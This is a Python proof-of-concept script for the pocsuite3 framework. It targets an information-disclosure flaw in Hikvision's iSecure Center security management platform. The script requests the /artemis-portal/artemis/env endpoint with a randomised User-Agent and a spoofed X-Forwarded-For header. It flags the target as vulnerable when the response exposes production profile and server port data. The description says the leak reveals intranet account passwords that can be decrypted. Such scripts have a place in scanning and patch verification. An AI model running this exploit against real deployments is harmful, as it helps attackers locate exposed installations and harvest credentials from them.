#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import contextlib
from poc_tool.tools import tools
from pocsuite3.api import (
    minimum_version_required, POCBase, register_poc, requests, logger
)

minimum_version_required('2.0.5')


class DemoPOC(POCBase):
    vulID = '0'
    version = '1'
    author = ''
    vulDate = '2023-11-17'
    createDate = '2023-11-17'
    updateDate = '2023-11-17'
    references = []
    name = '海康威视综合安防管理平台env信息泄露'
    appPowerLink = ''
    appName = '海康威视'
    appVersion = '综合安防管理平台'
    vulType = 'Information Disclosure'
    desc = """
    HIKVISION iSecure Center综合安防管理平台是一套“集成化”、“智能化”的平台，通过接入视频监控、一卡通、停车场、报警检测等系统的设备，海康威视综合安防管理平台信息存在信息泄露（内网集权账户密码）漏洞，可以通过解密软件，解密用户名密码。
    """
    samples = ['']
    install_requires = ['']
    pocDesc = 'User manual of poc'
    dork = {'zoomeye': ''}
    suricata_request = ''
    suricata_response = ''

    def _exploit(self):
        headers = {
            'User-agent': tools.get_random_ua(),
            'X-Forwarded-For': tools.get_random_ip()
        }
        res = requests.get(url=f"{self.url}/artemis-portal/artemis/env", headers=headers, verify=False)
        logger.debug(f"\n\n{tools.get_req(res)}\n\n{tools.get_res(res)}")
        return "prod" in res.json().get("profiles") and "local.server.port" in res.json().get("server.ports") and res.status_code == 200

    def _verify(self):
        with contextlib.suppress(Exception):
            result = {}
            res = self._exploit()
            if res:
                result['VerifyInfo'] = {
                    'URL': self.url,
                    '存在 海康威视综合安防管理平台env信息泄露': self.url,
                }
            return self.parse_output(result)

    def _attack(self):
        return self._verify()

    def _shell(self):
        return self._verify()


register_poc(DemoPOC)
